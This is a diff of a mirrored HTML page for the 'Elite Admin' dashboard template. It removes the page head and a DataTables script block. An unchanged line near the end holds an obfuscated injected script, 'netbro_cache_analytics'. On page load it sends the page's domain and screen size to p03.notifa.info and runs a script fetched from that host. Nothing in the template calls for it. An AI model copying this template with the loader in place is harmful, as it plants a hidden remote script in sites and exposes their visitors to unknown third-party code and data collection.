@@ -3,32 +3,6 @@
 
 
 <!-- Mirrored from eliteadmin.themedesigner.in/demos/bt4/eliteadmin/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Mar 2018 16:46:09 GMT -->
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <!-- Tell the browser to be responsive to screen width -->
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="author" content="">
-    <!-- Favicon icon -->
-    <link rel="icon" type="image/png" sizes="16x16" href="../assets/images/favicon.png">
-    <title>Elite Admin Template - The Ultimate Multipurpose admin template</title>
-    <!-- This page CSS -->
-    <!-- chartist CSS -->
-    <link href="{{asset('assets/node_modules/morrisjs/morris.css')}}" rel="stylesheet">
-    <!--Toaster Popup message CSS -->
-    <link href="{{asset('assets/node_modules/toast-master/css/jquery.toast.css')}}" rel="stylesheet">
-    <!-- Custom CSS -->
-    <link href="{{asset('dist/css/style.min.css')}}" rel="stylesheet">
-    <!-- Dashboard 1 Page CSS -->
-    <link href="{{asset('dist/css/pages/dashboard1.css')}}" rel="stylesheet">
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-<![endif]-->
-</head>
 
 <body class="skin-blue fixed-layout">
     <!-- ============================================================== -->
@@ -492,6 +466,7 @@
         <!-- ============================================================== -->
         <!-- footer -->
         <!-- ============================================================== -->
+      </div>
         <footer class="footer">
             © 2018 Eliteadmin by themedesigner.in
         </footer>
@@ -530,64 +505,6 @@
     <script src="dist/js/dashboard1.js"></script>
     <script src="assets/node_modules/toast-master/js/jquery.toast.js"></script>
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5myFsTwFUh3iNxcimG3fCJ1YSpk%2fMFlr4%2fkhqPrE%2bDBbYVRQhCFfTGNipr8DBaQ3%2b5GQJAWYR4tEe9Jayi87f3n2R5B4%2fG3pqeXAQCW3syS6kooBX1jEWxwvulCW%2fP%2fWmKxwQNEnIlJTNampYDjALm%2bd1hNdl6Kr9TTtXLPAoLdzZ8uMyAj9EZxGaGQ2UIMV3Ag9lwl9sjQX5Fi0AaqOppupOU81grrRfkecmeHn%2fVHDVtE6LVLdRx0tLDbR9tqEy3zgKSHR5oBUki8EQF2q2gac%2fShuKdNfp237OaXX2X8%2fJpZGQt6ybqB6sRtOIXXhy2zPuaYM4kzFkP37FNCZsyDAztARdPFbsD9KZTrIz7GVhbzQ%2fxJRNe%2b0RIP8cwHL1EyS6Ebs5HIpdAfntu27kvrz6C0IHlUV7IXgf56Iy0RdDg2f4Mbe17%2fVW1ZPCwPhS%2bR9Orov4P8qe2KwtFL4QguJ4aOcsTVQLyvMnR1Rcn1ptXF97UTzXvyA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-<script src="dist/js/custom.min.js"></script>
-<script src="assets/node_modules/datatables/jquery.dataTables.min.js"></script>
-<!-- start - This is for export functionality only -->
-<script src="cdn.datatables.net/buttons/1.2.2/js/dataTables.buttons.min.js"></script>
-<script src="cdn.datatables.net/buttons/1.2.2/js/buttons.flash.min.js"></script>
-<script src="cdnjs.cloudflare.com/ajax/libs/jszip/2.5.0/jszip.min.js"></script>
-<script src="cdn.rawgit.com/bpampuch/pdfmake/0.1.18/build/pdfmake.min.js"></script>
-<script src="cdn.rawgit.com/bpampuch/pdfmake/0.1.18/build/vfs_fonts.js"></script>
-<script src="cdn.datatables.net/buttons/1.2.2/js/buttons.html5.min.js"></script>
-<script src="cdn.datatables.net/buttons/1.2.2/js/buttons.print.min.js"></script>
-<!-- end - This is for export functionality only -->
-<script>
-$(document).ready(function() {
-    $('#myTable').DataTable();
-    $(document).ready(function() {
-        var table = $('#example').DataTable({
-            "columnDefs": [{
-                "visible": false,
-                "targets": 2
-            }],
-            "order": [
-                [2, 'asc']
-            ],
-            "displayLength": 25,
-            "drawCallback": function(settings) {
-                var api = this.api();
-                var rows = api.rows({
-                    page: 'current'
-                }).nodes();
-                var last = null;
-                api.column(2, {
-                    page: 'current'
-                }).data().each(function(group, i) {
-                    if (last !== group) {
-                        $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
-                        last = group;
-                    }
-                });
-            }
-        });
-        // Order by the grouping
-        $('#example tbody').on('click', 'tr.group', function() {
-            var currentOrder = table.order()[0];
-            if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
-                table.order([2, 'desc']).draw();
-            } else {
-                table.order([2, 'asc']).draw();
-            }
-        });
-    });
-});
-$('#example23').DataTable({
-    dom: 'Bfrtip',
-    buttons: [
-        'copy', 'csv', 'excel', 'pdf', 'print'
-    ]
-});
-</script>
 
 <!-- Mirrored from eliteadmin.themedesigner.in/demos/bt4/eliteadmin/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Mar 2018 16:51:25 GMT -->
 </html>
